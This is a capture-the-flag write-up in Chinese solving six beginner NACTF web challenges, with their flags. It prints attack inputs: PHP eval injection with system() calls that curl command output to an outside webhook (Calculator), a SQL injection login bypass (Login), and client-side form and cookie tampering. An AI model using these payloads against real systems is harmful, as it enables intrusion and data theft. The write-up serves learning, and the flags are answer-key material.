# NACTF write up (only web)

### Inspect
> 50
> Lola's new to website-building. Having just learned HTML and CSS, she built this site and embedded some dark secrets. I wonder where I could find them.
> http:/inspect.challenges.nactf.com/
* 直接用開發人員工具的 search，搜尋 `nactf{` 就可以了
* flag : `nactf{1nspect1ng_sp13s_4_lyf3}`

### Missing Image
> 75
> Max has been trying to add a picture to his first website. He uploaded the image to the server, but unfortunately, the image doesn't seem to be loading. I think he might be looking in the wrong subdomain...
> https://hidden.challenges.nactf.com/
* 有點通靈（？
* 直接到 https://hidden.challenges.nactf.com/flag.png 訪問就可以了
* flag : `nactf{h1dd3n_1mag3s}`

### Forms
> 125
> Skywalker has created 1000 login forms and only managed to make one of them work. Find the right one and login! He also went a bit crazy with the colors for some reason.
> https://forms.challenges.nactf.com/
* 直接看到最下面的 js
    ```js=
    function verify() {
        user = document.getElementById("username").value;
        pass = document.getElementById("password").value;
        if (user === "admin" && pass === "password123") {
            document.getElementById("submit").value = "correct_login";
        } else {
            document.getElementById("submit").value = "false";
        }
        document.form.submit();
    }
    ```
* 把 username 輸入 `admin`，password 輸入 `password123` ，把 submit 的 value 改成 `correct_login` 就可以拿到 flag 了
* flag : `nactf{cl13n75_ar3_3v11}`

### Calculator
> 150 
> Kevin has created a cool calculator that can perform almost any mathematical operation! It seems that he might have done this the lazy way though... He's also hidden a flag variable somewhere in the code.
> https://calculator.challenges.nactf.com/
> hint : What's the easiest way to evaluate user input?
* hint 要說的其實就是他的後端用的是 eval 來執行
* [eval](https://www.php.net/manual/en/function.eval.php)
* 可以知道 eval 是執行 php code 
* 所以可以嘗試一下 `system("ls")`，得到的回應是 index.php
* 直接 `cat index.php` 可以發現拿不到 source code 
* 所以嘗試用 base64 encode 過後拿到 value `cat index.php | base64` 可以發現拿不到所有的 value
* 這時候可以用 [webhook](https://webhook.site/) 來解決，並且加上 curl 指令
* `system('curl your_webhook -d "$(ls)"')` 可以在 webhook 的回應中看到 index.php
* 這時候 `system('curl your_webhook -d "$(cat index.php)"')` 可以看到關鍵的 flag
* `-d` 是指 form data 的意思
* `$(command)` https://unix.stackexchange.com/questions/147420/what-is-in-a-command
* 不過這一題理論上應該沒有要考那麼難拉，因為他有說 He's also hidden a flag variable somewhere in the code. 所以猜到他的 flag variable 就可以了（好像也挺難的！？
* 所以輸入 `$flag` 也會有答案拉
* flag : `nactf{ev1l_eval}`

### Cookie Recipe
> 150
> Arjun owns a cookie shop serving warm, delicious, oven-baked cookies. He sent me his ages-old family recipe dating back four generations through this link, but, for some reason, I can't get the recipe. Only cookie lovers are allowed!
> https://cookies.challenges.nactf.com/index.php
> hint : Arjun baked a cookie as an offering, but he accidently placed it on the front page.
* 這一題單純的改 cookie 而已，可以看到有一個 cookie 叫做 user，value 是 cookie_lover
* submit 之後跟你說你不是 cookie_lover
* 這時候看一下 cookie 的 path，是在 /index.php
* 把它改成 /auth.php 就可以了
* flag : `nactf{c00kie_m0nst3r_5bxr16o0z}`

### Login
> 175
> Vyom has learned his lesson about client side authentication and his soggy croutons will now be protected. There's no way you can log in to this secure portal!
> https://login.challenges.nactf.com/
> hint : https://xkcd.com/327/
* 沒什麼好說的，阿就 sql injection
* username : `'or 1=1 -- `，password : ` `
* flag : `nactf{sQllllllll_1m5qpr8x}`

### 總結
* 總的來說是挺適合新手入門的 ctf，有些題目出得滿好的，下次可以花時間打一下，畢竟接近期中考了，所以沒什麼時間打這東東，名次有點低，可惜了Ｑ
